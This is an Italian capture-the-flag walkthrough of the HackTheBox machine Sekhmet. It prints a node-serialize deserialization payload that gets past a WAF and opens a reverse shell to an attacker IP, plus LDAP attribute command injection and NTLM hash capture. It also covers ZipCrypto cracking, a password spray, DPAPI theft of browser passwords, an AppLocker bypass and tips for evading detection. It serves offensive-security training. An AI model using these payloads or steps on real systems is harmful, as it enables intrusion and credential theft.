---
title: 'HTB Sekhmet Walktrough: Node.js Deserialization, WAF Bypass e DPAPI'
slug: htb-sekhmet-walktrough
description: 'HTB Sekhmet Insane,WriteUp Completo: insecure deserialization in node-serialize, bypass ModSecurity con Unicode encoding, ZipCrypto, Kerberos su Linux e DPAPI su Active Directory.'
image: /Sekhmet-walktrough-hackthebox.webp
draft: false
date: 2026-06-04T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - active-directory
  - htb-writeup
  - node-serialization
---

# HTB Sekhmet: Insecure Deserialization in Node.js, WAF Bypass e Kerberos su Linux

**Difficoltà:** Insane | **OS:** Windows (con VM Linux embedded) | **Release:** Settembre 2022

***

Sekhmet è una delle macchine più articolate che HTB abbia mai pubblicato nella categoria Insane. Non è difficile perché richiede exploit oscuri o zero-day — è difficile perché ogni fase richiede di capire davvero cosa stai facendo. L'attacco inizia su un'app Express.js con una vulnerabilità di insecure deserialization in `node-serialize`, protetta da ModSecurity. Per bypassare il WAF devi capire come questo interpreta le richieste rispetto a come le interpreta il server Node. Poi atterri su una VM Linux joinata ad Active Directory, con un backup cifrato con ZipCrypto da rompere, hash AD da estrarre dal database locale di sssd, e un'escalation via Kerberos con `ksu`. Nella seconda fase: lateral movement sul DC Windows con command injection su un attributo LDAP, cattura di un hash Net-NTLMv2, password spray, DPAPI su Edge e accesso come Domain Admin.

***

## Recon

### nmap

```bash
nmap -p- --min-rate 10000 10.10.11.179
# PORT   STATE SERVICE
# 22/tcp open  ssh
# 80/tcp open  http

nmap -p 22,80 -sCV 10.10.11.179
# 22/tcp OpenSSH 8.4p1 Debian 5+deb11u1
# 80/tcp nginx/1.18.0 → 403 Forbidden
```

Due porte aperte. Il server risponde con 403 alla radice — c'è un virtual hosting attivo e il server non sa come gestire la richiesta senza il giusto `Host:` header. La versione di OpenSSH corrisponde a Debian 11 Bullseye. HTB mostra la macchina come Windows, ma SSH su Debian suggerisce subito una VM Linux dentro un host Windows — struttura tipica nei lab enterprise simulati.

### Subdomain Enumeration

Visitando `http://10.10.11.179` arriva un redirect verso `www.windcorp.htb`. Aggiungiamo al `/etc/hosts` e bruteforciamo i sottodomini:

```bash
ffuf -u http://10.10.11.179 \
     -H "Host: FUZZ.windcorp.htb" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac -mc all

# [Status: 403, Size: 2436] → FUZZ: portal
```

Il flag `-ac` (auto-calibrate) è fondamentale: ffuf manda qualche richiesta iniziale con valori casuali per capire come risponde il server a sottodomini inesistenti — costruisce la baseline. Da lì filtra automaticamente tutte le risposte identiche. Senza `-ac`, con `-mc all`, ti ritroveresti 20k false positive. Troviamo `portal.windcorp.htb` subito.

***

## Analisi del Portale: Fingerprinting

Su `portal.windcorp.htb` c'è una pagina di login. Le response headers rivelano il tech stack:

```
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
```

Node.js + Express. `admin:admin` funziona. Il login imposta un cookie:

```
Set-Cookie: profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2ODAwMjM5Nzc1NzF9
```

```bash
echo "eyJ1..." | base64 -d
# {"username":"admin","admin":"1","logon":1680023977571}
```

Il campo `logon` è un timestamp in millisecondi. L'app mostra da quanti secondi sei loggato — quindi quel cookie viene deserializzato ad ogni richiesta per calcolare la differenza.

***

## Prototype Pollution: Vicolo Cieco

Prima di arrivare alla deserialization, ho passato un bel po' di tempo a provare server-side prototype pollution. Il campo `logon` riflesso nella pagina era un indicatore classico: provando `constructor.prototype.logon=x` nel cookie, la risposta tornava `NaN` secondi — conferma che la pollution funzionava.

Ma pollution confermata non è RCE automatica. Serve un gadget — codice nel codebase che legga dalla prototype chain e faccia qualcosa di utile. Ho tentato `execArgv`, `shell`, `NODE_OPTIONS`, vettori classici per `child_process.spawn`, senza ottenere nulla. Nessun callback sul listener.

La lezione: **quando sei bloccato sullo stesso vettore per ore senza progressi concreti, è ora di cambiare strada.** La prototype pollution c'era, ma non portava da nessuna parte su questa app. Ho cambiato approccio e guardato il cookie da un'altra angolazione.

***

## Insecure Deserialization in Node.js

### node-serialize vs JSON

`node-serialize` serializza oggetti JavaScript incluse le funzioni — cosa che `JSON.stringify/parse` non fa:

```javascript
// JSON.parse — sicuro, ignora funzioni
JSON.parse('{"cmd":"ls"}')  // → { cmd: 'ls' }

// node-serialize — pericoloso
var serialize = require('node-serialize');
serialize.unserialize('{"x":"_$$ND_FUNC$$_function(){ return require(\'child_process\').execSync(\'id\').toString() }()"}');
// → uid=1000(webster)...
```

La stringa magic `_$$ND_FUNC$$_` è il trigger. Quando `unserialize()` la incontra, ricostruisce la funzione passandola a `eval()`. Internamente:

```javascript
if (val.indexOf('_$$ND_FUNC$$_') === 0) {
    val = eval('(' + val.substring(13) + ')');
}
```

### IIFE: perché serve il `()` finale

```javascript
// Funzione DEFINITA, non eseguita:
function(){ require('child_process').exec('id') }

// IIFE — definita e immediatamente eseguita:
function(){ require('child_process').exec('id') }()
```

Senza il `()` finale, `eval()` definisce la funzione ma non la chiama. Con il `()` viene eseguita immediatamente durante la deserializzazione.

Payload base:

```json
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping -c 1 10.10.14.X', function(error,stdout,stderr){ console.log(stdout) })}()"}
```

Encode in base64, cookie `profile` → ModSecurity blocca con 403.

***

## ModSecurity: Anatomia del Blocco

ModSecurity con OWASP CRS monitora in `REQUEST-934-APPLICATION-ATTACK-GENERIC.conf` le stringhe:

* `_$$ND_FUNC$$_`
* `function() {`
* `eval(`
* `String.fromCharCode(`

La versione recente del CRS applica la trasformazione `urlDecodeUni` prima della regex — decodifica sia `%XX` che `\uXXXX`. La versione su Sekhmet è più vecchia e **non include `urlDecodeUni`**. Questo è il punto debole.

***

## Il Bypass Unicode

### Il meccanismo

Due attori, stessa stringa, comportamento diverso:

* **ModSecurity** — analizza il raw cookie come testo, senza decodificare `\uXXXX`
* **Node.js** — fa `JSON.parse()`, che supporta nativamente gli escape Unicode

Se scriviamo `\u0024` invece di `$` (codepoint U+0024):

* Il WAF vede `\u0024`, cerca `$$`, non matcha — **non blocca**
* `JSON.parse()` converte `\u0024` in `$`, il server ottiene `_$$ND_FUNC$$_` intatto

Stessa logica per `{` → `\u007b`.

### Payload finale

Procediamo incrementalmente aggiungendo un token alla volta finché il WAF non blocca di nuovo, poi encodiamo quel token:

```json
{"rce":"_$$ND_FUNC\u0024$_function() \u007brequire('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.X/443 0>&1\"', function(error,stdout,stderr) {console.log(stdout)});\n}()"}
```

Encode in base64, Burp Repeater come cookie `profile`, listener aperto:

```bash
nc -lnvp 443
# webster@webserver:/$
```

Upgrade della shell:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset  # Terminal type? screen
```

***

## VM Linux: Enumerazione

### Rete interna

```bash
ip addr
# eth0: 192.168.0.100/24

for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" &); done
# 192.168.0.2 → hope.windcorp.htb (DC)
# 192.168.0.100 → noi stessi
```

### sssd: Linux joinato ad AD

```bash
ps auxww | grep sss
# /usr/sbin/sssd
# /usr/libexec/sssd/sssd_be --domain windcorp.htb
```

sssd (System Security Services Daemon) connette Linux ad Active Directory intercettando PAM/NSS. Per funzionare offline cachea localmente gli hash delle password degli utenti autenticati in un database TDB in `/var/lib/sss/db/`. Come `webster` non possiamo accederci — ma un backup del filesystem potrebbe contenerlo.

***

## backup.zip: ZipCrypto Known Plaintext Attack

```bash
7z l -slt backup.zip | grep -E "Method|Encrypted"
# Method = ZipCrypto Deflate
# Encrypted = +
```

`zip2john` mostra i metadati dell'archivio — nome dei file, dimensioni, CRC32 — anche senza password. Il contenuto è cifrato, i metadati no. Questo è esattamente quello che serve per il known plaintext attack: se riusciamo a trovare il plaintext di uno dei file nell'archivio, possiamo usare **bkcrack con lo stesso file** per rompere la cifratura.

### Perché ZipCrypto è rotto

ZipCrypto è un stream cipher degli anni '90 con tre word a 32 bit come stato interno (K0, K1, K2). Biham e Kocher nel 1994 dimostrarono che con **12 byte consecutivi di plaintext noto** puoi ricostruire le chiavi interne indipendentemente dalla password. Con quelle chiavi decifri tutto l'archivio.

Nell'archivio c'è `etc/passwd`. Verifichiamo che sia identico al file attuale con il CRC32:

```python
python3 -c "
import binascii
data = open('/etc/passwd','rb').read()
print(hex(binascii.crc32(data) & 0xffffffff))
"
# 0xd00eee74  ← identico al CRC nel backup.zip
```

```bash
# Zip del plaintext noto
zip plain.zip passwd

# Recupero delle chiavi interne
bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd
# Keys: d6829d8d 8514ff97 afc3f825

# Nuovo archivio con password nota
bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U backup-pass.zip pass

7z x backup-pass.zip  # password: pass
# → etc/ e var/lib/sss/db/
```

***

## Estrazione Hash da sssd

```bash
apt install samba  # per tdbdump
tdbdump cache_windcorp.htb.ldb | grep -A 5 "cachedPassword"
# $6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035...wg2zX81
```

Hash SHA-512 Unix (`$6$`) di Ray.Duncan — salvato da sssd per il login offline:

```bash
hashcat ray.hash /usr/share/wordlists/rockyou.txt
# $6$nHb338EAa7BAeuR0$...:pantera
```

***

## Escalation a root via Kerberos + ksu

```bash
kinit ray.duncan   # password: pantera
klist
# Default principal: ray.duncan@WINDCORP.HTB
```

`ksu` è l'equivalente Kerberos di `su`. Non usa `/etc/sudoers` — usa il file `/root/.k5users` o `/root/.k5login` per decidere se l'utente Kerberos autenticato può diventare root.

```bash
ksu
# Authenticated ray.duncan@WINDCORP.HTB
# Account root: authorization for ray.duncan@WINDCORP.HTB successful
root@webserver:/home/webster#
```

```bash
# SSH persistente
echo "ssh-ed25519 AAAA... " >> /root/.ssh/authorized_keys
```

***

## Pivoting verso hope.windcorp.htb

```bash
# Nmap statico sul DC
./nmap -p- --min-rate 10000 192.168.0.2
# 22, 53, 88, 389, 445, 5985, 9389...
```

DC classico — WinRM e SMB aperti.

### Tunnel SOCKS via SSH

```bash
# Sulla sessione SSH: Enter ×2 poi ~C
ssh> -D 1080
```

In alternativa ligolo-ng è più comodo per ambienti multi-pivot, ma qui una sola rete interna — il SOCKS basta.

Configuriamo Kerberos su Kali:

```ini
# /etc/krb5.conf
[libdefaults]
    default_realm = WINDCORP.HTB
[realms]
    WINDCORP.HTB = { kdc = hope.windcorp.htb }
```

```bash
proxychains kinit ray.duncan
# password: pantera
```

***

## SMB Enumeration sul DC

Qui ho incontrato un problema. I tool impacket attuali (smbclient.py, ecc.) con proxychains e Kerberos su questa configurazione non autenticavano correttamente — la connessione arrivava ma l'autenticazione falliva. Pensavo di sbagliare il procedimento. Ho controllato un [riferimento specifico](https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html#creds-for-bobwood) e ho visto che la procedura era giusta — era la versione di impacket. Con **impacket v0.10** funzionava correttamente.

```bash
proxychains smbclient -k -L //hope.windcorp.htb
# ADMIN$, C$, IPC$, NETLOGON, SYSVOL, WC-Share
```

`WC-Share` è l'unica share non standard. Dentro:

```bash
proxychains smbclient -k //hope.windcorp.htb/WC-Share
smb: \> ls
# temp/
smb: \> cd temp
smb: \temp\> get debug-users.txt
```

```
IvanJennings43235345
MiriamMills93827637
BenjaminHernandez23232323
RayDuncan9342211
```

Quattro entry con nome utente + numero. Questo file viene aggiornato da qualcosa in background. Su NETLOGON:

```bash
proxychains smbclient -k //hope.windcorp.htb/NETLOGON
smb: \> get form.ps1
```

`form.ps1` è uno script PowerShell che costruisce una GUI per aggiornare l'attributo `mobile` in LDAP. La parte rilevante:

```powershell
if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    $x = $textBox.Text
    $User.Put("mobile", $x)
    $User.SetInfo()
}
```

Il file punta dritto all'attributo `mobile`. I numeri nel `debug-users.txt` corrispondono probabilmente ai valori mobile degli utenti. C'è uno script che ogni tot minuti legge i mobile attribute da LDAP e scrive il file.

***

## Command Injection via Attributo LDAP

Se lo script legge `mobile` e lo usa senza sanificarlo, abbiamo command injection. Dalla VM come root (abbiamo un ticket Kerberos valido), modifichiamo il mobile di Ray.Duncan:

```bash
echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: 223223223' \
  | ldapmodify -H ldap://hope.windcorp.htb
# SASL/GSS-SPNEGO authentication started
# modifying entry "CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB"
```

Dopo circa due minuti (tempo del cron), `debug-users.txt` si aggiorna:

```
RayDuncan223223223
```

Il valore viene riflesso direttamente. Proviamo injection con `$(whoami)`:

```bash
echo -e 'dn: CN=RAY DUNCAN,...\nchangetype: modify\nreplace: mobile\nmobile: $(whoami)' \
  | ldapmodify -H ldap://hope.windcorp.htb
```

Output nel file:

```
RayDuncanwindcorp\scriptrunner
```

**Command injection confermato.** Lo script gira come `WINDCORP\scriptrunner`. Verifichiamo la connettività verso di noi:

```bash
mobile: $(ping 10.10.14.X)
```

```bash
sudo tcpdump -ni tun0 icmp
# 10.10.11.179 → 10.10.14.X: ICMP echo request
```

RCE sul DC come scriptrunner, ma non possiamo fare reverse shell diretta (AppLocker blocca binari esterni). Puntiamo a catturare l'hash.

***

## Cattura Hash Net-NTLMv2 di scriptrunner

Per far arrivare l'autenticazione SMB al nostro smbserver.py, dobbiamo fare routing attraverso la VM — il DC non può raggiungere direttamente la nostra tun0.

Prima abilitiamo il port forwarding remoto su SSH:

```bash
# In /etc/ssh/sshd_config su webserver:
GatewayPorts yes
service sshd restart
```

Poi riconnettiamo SSH con tunnel inverso:

```bash
sudo ssh -i ~/keys/ed25519_gen root@10.10.11.179 \
  -D 1080 \
  -R 0.0.0.0:445:127.0.0.1:445
```

`-R 0.0.0.0:445:127.0.0.1:445` → il webserver ascolta su porta 445 su tutte le interfacce e inoltra via SSH al nostro smbserver.py locale.

Avviamo smbserver.py (impacket v0.10):

```bash
smbserver.py df . -smb2support
```

Impostiamo il mobile attribute:

```bash
mobile: $(net use \\\\webserver.windcorp.htb\\df 2>&1)
```

Quando lo script viene eseguito, catturiamo il Net-NTLMv2 di scriptrunner:

```
[*] AUTHENTICATE_MESSAGE (WINDCORP\scriptrunner,HOPE)
[*] scriptrunner::WINDCORP:aaaa...:6dd2c5e5...:0101...
```

```bash
hashcat scriptrunner.hash /usr/share/wordlists/rockyou.txt
# SCRIPTRUNNER::WINDCORP:...:!@p%i&J#iNNo1T2
```

Password: `!@p%i&J#iNNo1T2`

***

## Password Spray con Kerbrute

scriptrunner è un account di servizio senza WinRM. Ma la stessa password potrebbe essere condivisa. Recuperiamo tutti gli utenti del dominio:

```bash
ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName \
  | grep sAMAccountName | awk '{print $2}' > domainusers
# 597 utenti
```

Carichiamo kerbrute sulla VM e lanciamo lo spray:

```bash
./kerbrute passwordspray -d windcorp.htb domainusers '!@p%i&J#iNNo1T2'

# [+] VALID LOGIN: Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
# [+] VALID LOGIN: scriptrunner@windcorp.htb:!@p%i&J#iNNo1T2
```

Bob.Wood usa la stessa password. Da `ldapsearch` vediamo che è nel gruppo `Adminusers` e `IT` — probabile accesso WinRM.

***

## Shell come Bob.Wood

```bash
proxychains kinit bob.wood    # password: !@p%i&J#iNNo1T2
proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb

# *Evil-WinRM* PS C:\Users\Bob.Wood\Documents>
```

Siamo dentro come Bob.Wood, ma non siamo Domain Admin. Nella home di Bob.Wood non c'è ancora molto — l'obiettivo è DPAPI.

***

## DPAPI: Credenziali Cifrate in Edge

### La struttura

DPAPI (Data Protection API) è il meccanismo Windows per cifrare secrets legandoli all'identità dell'utente. Le chiavi derivano dalla password dell'utente tramite masterkey. Edge (Chromium) salva le password in un database SQLite (`Login Data`) cifrato con DPAPI.

I file che ci servono:

* `C:\Users\Bob.Wood\AppData\Local\Microsoft\Edge\User Data\Default\Login Data` — database SQLite con le password cifrate
* `C:\Users\Bob.Wood\AppData\Local\Microsoft\Edge\User Data\Local State` — JSON con la chiave di cifratura specifica di Edge, a sua volta cifrata con DPAPI
* `C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\{SID}\` — masterkey DPAPI

Per l'approfondimento completo sul funzionamento interno di DPAPI, la struttura delle masterkey e come estrarle: [DPAPI: estrarre credenziali cifrate su Windows](https://hackita.it/articoli/dpapi).

### AppLocker: trovare dove eseguire

Mimikatz viene bloccato da AppLocker. Per capire cosa possiamo eseguire e da dove:

```powershell
get-applockerpolicy -effective -xml
```

La policy consente l'esecuzione da `%WINDIR%\*` con eccezioni. Cercando directory comuni scrivibili da utenti normali che non sono nell'eccezioni list, troviamo `C:\windows\debug\wia`:

```powershell
echo "test" > C:\windows\debug\wia\test.txt   # funziona
copy \windows\system32\cmd.exe C:\windows\debug\wia\c.exe
.\c.exe /c echo "running"   # funziona
```

Non è nell'elenco dei blocchi AppLocker — possiamo eseguire binari da lì.

***

## Metodo 1: DPAPI Offline con pypykatz

### Exfiltrazione dei file Edge

`Local State` è un JSON che possiamo leggere direttamente. `Login Data` è binario — usiamo certutil per la codifica:

```powershell
certutil -encode "Login Data" \programdata\logindata
type \programdata\logindata
# → base64 molto lungo, copiamo via terminale
```

Un'alternativa più pulita, visto che abbiamo già accesso in scrittura su `WC-Share`: copiamo i file direttamente sullo share SMB e li scarichiamo da lì senza passare per la clipboard o certutil:

```powershell
copy "Local State" "C:\WC-Share\temp\state"
copy "Login Data"  "C:\WC-Share\temp\logindata"
```

Dal Kali:

```bash
proxychains smbclient -k //hope.windcorp.htb/WC-Share
smb: \temp\> get state
smb: \temp\> get logindata
```

Più comodo, zero encoding intermedi, file binari intatti.

Su Kali decodifichiamo e otteniamo il database SQLite:

```bash
file logindata
# logindata: SQLite 3.x database
```

### Analisi Login Data

```bash
sqlite3 logindata
sqlite> select origin_url, username_value, password_value from logins;
# http://somewhere.com     | bob.wood@windcorp.htb  | [cifrato]
# http://google.com        | bob.wood@windcorp.htb  | [cifrato]
# http://webmail.windcorp.com | bob.woodADM@windcorp.com | [cifrato]
```

Tre account — uno è `bob.woodADM`. La chiave di cifratura è in `Local State`:

```bash
cat localstate | jq -r .os_crypt.encrypted_key
# DPAPI... base64
```

### Decrypt con pypykatz

Il processo è in 4 step:

```bash
# Step 1: pre-chiavi dal SID + password
pypykatz dpapi prekey password \
  'S-1-5-21-1844305427-4058123335-2739572863-2761' \
  '!@p%i&J#iNNo1T2' | tee pkf
# → 3 pre-chiavi SHA

# Step 2: masterkey decifrata
pypykatz dpapi masterkey \
  a8bd1009-f2ac-43ca-9266-8e029f503e11 pkf -o mkf

# Step 3+4: decrypt Edge
pypykatz dpapi chrome --logindata logindata mkf localstate
```

Output:

```
user: bob.wood@windcorp.htb    pass: SemTro32756Gff         url: http://somewhere.com
user: bob.wood@windcorp.htb    pass: SomeSecurePasswordIGuess!09  url: http://google.com
user: bob.woodADM@windcorp.com pass: smeT-Worg-wer-m024     url: http://webmail.windcorp.com
```

***

## Metodo 2: SharpChromium On-Box

Alternativa più rapida: SharpChromium, binary .NET che non triggera AppLocker se caricato nella directory giusta.

```powershell
# Da Evil-WinRM
iwr http://10.10.14.X/SharpChromium.exe -outfile C:\windows\debug\wia\scium.exe
.\scium.exe logins
```

Output identico al metodo offline — stesse tre password. Il metodo 2 è più rapido, ma richiede di uploadare un binary sul target. Il metodo 1 è più stealth.

***

## Domain Admin: bob.woodADM

`bob.woodADM@windcorp.com` è chiaramente l'account privilegiato di Bob.Wood. La password salvata in Edge per la webmail è la password di dominio:

```bash
proxychains kinit bob.woodadm
# password: smeT-Worg-wer-m024

proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb

# *Evil-WinRM* PS C:\Users\bob.woodadm\Documents>
```

```powershell
whoami /groups
# WINDCORP\Domain Admins — Mandatory group, Enabled
```

```powershell
type C:\Users\administrator\desktop\root.txt
# b5fd7823...
```

***

## OPSEC Notes

**Deserialization entry:** payload genera un processo figlio visibile nel process list. In produzione si preferisce una shell in-process.

**sssd hash extraction:** lavorare su un backup evita accessi live a `/var/lib/sss/db/` rilevabili da auditd.

**Kerberos ticket:** durata limitata — con sessioni lunghe usare `k5start` per il rinnovo automatico.

**Command injection via mobile attribute:** vettore stealth — non richiede accesso diretto al filesystem del DC, solo permesso di scrittura sull'attributo LDAP dell'utente.

**Net-NTLMv2 capture:** catturato via tunnel SSH reverse — zero traffico diretto da tun0 al DC, passa tutto attraverso la VM interna.

**DPAPI offline:** decifrato su Kali — nessun evento DPAPI generato sul DC, a differenza di Mimikatz diretto sulla macchina.

**AppLocker bypass:** invece di cercare bypass esotici, identificare directory con permessi di scrittura non bloccate dalla policy. `C:\windows\debug\wia` non compare nelle eccezioni e non è bloccata — basta copiare lì il binary.

***

## Concetti Chiave

* La prototype pollution andava confermata ma non portava a RCE — quando sei bloccato troppo a lungo, cambia vettore
* `node-serialize` usa `eval()` internamente sul marker `_$$ND_FUNC$$_` — qualsiasi dato non trusted che arriva a `unserialize()` è RCE
* Il bypass WAF funziona perché `urlDecodeUni` mancante: ModSecurity vede `\u0024` come letterale, `JSON.parse()` lo interpreta come `$`
* Se `zip2john` mostra i file con CRC32 in un archivio ZipCrypto, hai abbastanza per `bkcrack` — il plaintext dello stesso file sulla macchina è la chiave
* sssd cachea hash AD localmente — un backup del filesystem è come avere il SAM del dominio
* `ksu` usa Kerberos, non sudoers — il ticket è la chiave
* Il campo `mobile` in LDAP è scrivibile dall'utente su se stesso in molte configurazioni — se uno script lo legge senza sanificazione, è command injection
* Stessa password su account di servizio e utenti reali è un problema AD reale, non solo CTF
* DPAPI offline non genera eventi sul target — preferire sempre all'esecuzione di Mimikatz in-place
